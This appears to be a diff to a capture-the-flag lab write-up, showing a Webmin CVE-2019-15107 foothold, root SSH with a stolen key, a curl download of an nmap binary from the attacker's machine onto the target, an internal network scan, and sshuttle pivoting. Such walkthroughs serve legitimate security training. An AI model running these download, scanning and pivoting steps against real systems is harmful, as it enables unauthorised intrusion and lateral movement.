@@ -31,7 +31,7 @@ PORT      STATE  SERVICE    VERSION
 | http-methods: 
 |_  Supported Methods: HEAD POST OPTIONS
 ````
-- - On exploring website I found nothing.
+- - On exploring the website I found nothing.
 - - On observing I got **Miniserv** running on port 10000 with a vulnerable version.
 - - On googling I found [CVE-2019-15107](https://github.com/MuirlandOracle/CVE-2019-15107) exploit.
 ````bash
@@ -76,13 +76,29 @@ ssh -i id_rsa root@10.200.96.200
 [root@prod-serv ~]# whoami
 root
 ```
-- Now, we have initial access to the machine. Let's do a quick ping to the internal network.
+- Now, we have initial access to the machine. Let's do a quick transfer of the Nmap binary to the target and scan the network.
 ```bash
-for i in {1..255}; do (ping -c 1 10.200.96.${i} | grep "bytes from" &); done
+python -m http.server 80   # On the attacking machine
 
-64 bytes from 10.200.96.1: icmp_seq=1 ttl=255 time=0.344 ms
-64 bytes from 10.200.96.200: icmp_seq=1 ttl=64 time=0.076 ms
-64 bytes from 10.200.96.250: icmp_seq=1 ttl=64 time=1.71 ms
+curl http://10.50.76.115/nmap -o nmap
+
+ ./nmap -sn 10.200.96.0/24
+
+Nmap scan report for ip-10-200-96-100.eu-west-1.compute.internal (10.200.96.100)
+Host is up (0.00019s latency).
+MAC Address: 02:87:9C:68:6C:41 (Unknown)
+Nmap scan report for ip-10-200-96-150.eu-west-1.compute.internal (10.200.96.150)
+Host is up (0.00016s latency).
+MAC Address: 02:23:CB:7E:65:CD (Unknown)
+Nmap scan report for ip-10-200-96-200.eu-west-1.compute.internal (10.200.96.200)
+Host is up.
+Nmap done: 256 IP addresses (3 hosts up) scanned in 4.93 seconds
 ```
 - So, we found 2 machines in the internal network.
+- Next, we have to make a reverse connection to the internal network, for this, we will use sshuttle with the private key.
+```bash
+sshuttle -r root@10.200.96.200 --ssh-cmd "ssh -i id_rsa" 10.200.96.0/24
+
+c : Connected to server.
+```
 - 
